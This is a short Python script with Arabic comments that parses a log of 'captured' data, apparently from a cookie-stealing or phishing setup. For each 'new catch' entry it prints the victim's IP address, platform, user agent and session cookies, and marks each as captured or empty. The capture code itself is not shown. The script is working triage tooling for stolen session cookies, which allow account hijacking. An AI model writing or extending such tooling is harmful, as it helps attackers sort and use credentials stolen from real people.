import base64
import json
import os

# ألوان التنسيق
GREEN = '\033[92m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
RED = '\033[91m'
END = '\033[0m'

LOG_FILE = "captured_evidence.txt"

def analyze():
    if not os.path.exists(LOG_FILE):
        print(f"{RED}[!] ملف الأدلة غير موجود بعد.{END}")
        return

    print(f"{CYAN}🔍 تحليل ملف الأدلة الرقمية...{END}\n")
    print(f"{'No.':<4} | {'Platform':<15} | {'IP Address':<15} | {'Cookie Status'}")
    print("-" * 60)

    with open(LOG_FILE, "r", encoding="utf-8") as f:
        lines = f.readlines()
        
        target_count = 0
        for i, line in enumerate(lines):
            if "--- [!] صيد جديد -" in line:
                target_count += 1
                ip = line.split("-")[2].strip()
                # السطر الذي يلي العنوان يحتوي على البيانات
                data_line = lines[i+1].strip()
                
                try:
                    # فك تشفير JSON
                    decoded = json.loads(data_line)
                    platform = decoded.get('platform', 'Unknown')
                    cookies = decoded.get('cookies', '')
                    cookie_stat = f"{GREEN}CAPTURED{END}" if cookies else f"{RED}EMPTY{END}"
                    
                    print(f"{target_count:<4} | {platform:<15} | {ip:<15} | {cookie_stat}")
                    
                    # عرض التفاصيل العميقة إذا طلبت
                    print(f"{YELLOW}   [>] UserAgent:{END} {decoded.get('userAgent')}")
                    if cookies:
                        print(f"{YELLOW}   [>] Cookies:{END} {cookies[:100]}...") # عرض أول 100 حرف فقط
                    print("-" * 60)
                except:
                    continue

if __name__ == "__main__":
    analyze()
